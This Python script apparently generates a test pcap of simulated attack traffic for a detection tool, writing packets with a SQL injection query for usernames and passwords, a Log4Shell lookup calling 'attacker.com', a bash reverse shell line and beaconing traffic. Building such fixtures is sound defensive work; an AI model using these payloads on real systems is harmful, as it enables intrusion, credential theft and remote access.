from scapy.all import wrpcap, Ether, IP, TCP, UDP, Raw
import os

def generate_expert_pcap(filename="tests/expert_sample.pcap"):
    packets = []
    
    # 1. SQL Injection Attempt
    packets.append(Ether()/IP(src="10.0.0.5", dst="192.168.1.100")/TCP(sport=12345, dport=80)/Raw(load="GET /search?q=UNION+SELECT+null,username,password+FROM+users HTTP/1.1\r\nHost: target.local\r\n\r\n"))
    
    # 2. Log4Shell Attempt
    packets.append(Ether()/IP(src="10.0.0.6", dst="192.168.1.101")/TCP(sport=12346, dport=8080)/Raw(load="GET /login HTTP/1.1\r\nUser-Agent: ${jndi:ldap://attacker.com/a}\r\n\r\n"))
    
    # 3. Reverse Shell (Bash)
    packets.append(Ether()/IP(src="192.168.1.100", dst="10.0.0.7")/TCP(sport=4444, dport=80)/Raw(load="bash -i >& /dev/tcp/10.0.0.7/4444 0>&1"))
    
    # 4. Beaconing Simulation (Multiple small packets)
    for _ in range(10):
        packets.append(Ether()/IP(src="192.168.1.50", dst="10.0.0.8")/TCP(sport=5555, dport=443)/Raw(load="metadata=base64_encoded_data"))
        
    wrpcap(filename, packets)
    print(f"Expert PCAP generated: {filename}")

if __name__ == "__main__":
    if not os.path.exists("tests"): os.makedirs("tests")
    generate_expert_pcap()
